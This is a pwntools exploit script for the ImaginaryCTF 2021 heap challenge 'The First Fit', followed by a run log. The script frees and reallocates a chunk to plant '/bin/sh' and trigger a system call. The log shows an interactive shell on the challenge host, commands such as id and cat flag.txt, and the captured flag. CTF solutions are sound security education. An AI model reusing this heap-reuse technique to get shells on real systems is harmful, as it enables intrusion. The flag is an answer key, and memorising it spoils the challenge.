from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './the_first_fit'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42003
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

def Malloc(idx):
  s.sendlineafter("> ", "1")
  s.sendlineafter(">> ", str(idx))

def Free(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter(">> ", str(idx))

def Fill_a(data):
  s.sendlineafter("> ", "3")
  s.sendlineafter(">> ", data)

def System_b():
  s.sendlineafter("> ", "4")

Free(1)
Malloc(2)
Fill_a("/bin/sh\x00")
System_b()

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_The_First_Fit_150$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_The_First_Fit_150/the_first_fit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.imaginaryctf.org on port 42003: Done
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 16
-rw-r--r-- 1 nobody nogroup   31 Jul 26 14:34 flag.txt
-rwxr-xr-x 1 nobody nogroup 8672 Jul 26 14:34 run
$ cat flag.txt
ictf{w3lc0me_t0_h34p_24bd59b0}
'''

